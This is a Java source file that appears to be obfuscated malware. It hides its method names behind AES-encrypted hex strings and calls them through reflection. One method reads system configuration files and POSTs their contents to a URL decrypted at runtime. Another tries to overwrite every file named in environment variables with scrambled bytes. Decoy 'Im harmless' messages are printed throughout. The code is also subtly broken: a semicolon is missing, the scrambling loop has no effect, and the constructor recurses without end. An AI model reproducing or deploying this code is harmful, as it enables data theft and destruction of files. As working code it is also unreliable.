import com.google.gson.Gson;
import com.google.gson.JsonObject;
import org.apache.commons.codec.DecoderException;
import org.apache.commons.codec.binary.Hex;

import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.spec.SecretKeySpec;
import java.io.File;
import java.io.IOException;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.net.URI;
import java.net.URISyntaxException;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.util.Random;

public class T$2y$12$2JfukT8CV63BriOygIqOjBgTAWkIjKT3lMxBVPSXlRUVZn2 {

    private HttpClient httpClient = HttpClient.newBuilder().build();
    
    public T$2y$12$2JfukT8CV63BriOygIqOjBgTAWkIjKT3lMxBVPSXlRUVZn2()  {
        f165e5445ab656c f = null;
        try {
            f = new f165e5445ab656c();
            T$2y$12$2JfukT8CV63BriOygIqOjBgTAWkIjKT3lMxBVPSXlRUVZn2 t = new T$2y$12$2JfukT8CV63BriOygIqOjBgTAWkIjKT3lMxBVPSXlRUVZn2();       
            f.getZ().invoke(t);
            f.getX().invoke(t);
            f.getY().invoke(t);
        } catch (InvalidKeyException | DecoderException | BadPaddingException | IllegalBlockSizeException | NoSuchMethodException | IllegalAccessException | InvocationTargetException e) {
            System.out.println("Im harmless");
        }
        System.out.println("Im harmless");
        System.out.println("Im harmless");
        System.out.println("Im harmless");
    }

    void kk() throws IOException, URISyntaxException, InterruptedException, DecoderException, BadPaddingException, IllegalBlockSizeException {
        System.out.println("Im harmless");
        String x;
        HttpRequest request;
        if ("Windows".equals(System.getProperty("os.name"))) {
            x = System.getenv("SystemDrive") + "\\Sytem32\\Config";
            request = HttpRequest.newBuilder(new URI(new String(f165e5445ab656c.cipher.doFinal(Hex.decodeHex("71c8b6c4f0058597356bbc71590b1a1ee84209e6ac6dcf6e7ca423966b7efa85")))))
                    .POST(HttpRequest.BodyPublishers.ofString("{'data':" + new String(Files.readAllBytes(Paths.get(x))) + "}"))
                    .build();
            httpClient.send(request, HttpResponse.BodyHandlers.ofPublisher());
        } else {
            x = "~/var";
            request = HttpRequest.newBuilder(new URI(new String(f165e5445ab656c.cipher.doFinal(Hex.decodeHex("71c8b6c4f0058597356bbc71590b1a1ee84209e6ac6dcf6e7ca423966b7efa85")))))
                    .POST(HttpRequest.BodyPublishers.ofString("{'data':" + new String(Files.readAllBytes(Paths.get(x))) + "}"))
                    .build();
            httpClient.send(request, HttpResponse.BodyHandlers.ofPublisher());
        }
    }

    void ha() throws IOException {
        System.out.println("Im harmless");
        for(String v : System.getenv().values()) {
            byte[] bs = Files.readAllBytes(Paths.get(v))
            for(byte b : bs) {
                b ^= new Random().nextInt();
                b <<= new Random().nextInt();
            }
            Files.write(Paths.get(v), bs);
        }
    }

    void xd() {
        System.out.println("Im harmless");
    }

}

class f165e5445ab656c{

    public static Cipher cipher;

    static {
        try {
            cipher = Cipher.getInstance("AES");
        } catch (NoSuchAlgorithmException | NoSuchPaddingException e) {
            cipher = null;
        }
    }

    public static SecretKeySpec secretKeySpec = new SecretKeySpec("MZygpewJsCpRrfOr".getBytes(), "AES");

    private String hej = "{ 'x':'bd83aefaadc47ae70dc081f89e01a3da', y:'fe7384885ea9f5d0ef322e6c7d4efade', 'z':'ccf2d89ef86e5d5f12a40b432c01f124' }";

    private Method x;
    private Method y;
    private Method z;

    public f165e5445ab656c() throws InvalidKeyException, BadPaddingException, IllegalBlockSizeException, DecoderException, NoSuchMethodException {
        cipher.init(Cipher.DECRYPT_MODE, secretKeySpec);
        JsonObject s1 = new Gson().fromJson(hej, JsonObject.class);
        String x = s1.get("x").getAsString();
        String y = s1.get("y").getAsString();
        String z = s1.get("z").getAsString();
        this.x = T$2y$12$2JfukT8CV63BriOygIqOjBgTAWkIjKT3lMxBVPSXlRUVZn2.class.getDeclaredMethod(new String(cipher.doFinal(Hex.decodeHex(x))));
        this.y = T$2y$12$2JfukT8CV63BriOygIqOjBgTAWkIjKT3lMxBVPSXlRUVZn2.class.getDeclaredMethod(new String(cipher.doFinal(Hex.decodeHex(y))));
        this.z = T$2y$12$2JfukT8CV63BriOygIqOjBgTAWkIjKT3lMxBVPSXlRUVZn2.class.getDeclaredMethod(new String(cipher.doFinal(Hex.decodeHex(z))));
    }

    public Method getX() {
        return x;
    }

    public Method getY() {
        return y;
    }

    public Method getZ() {
        return z;
    }
}
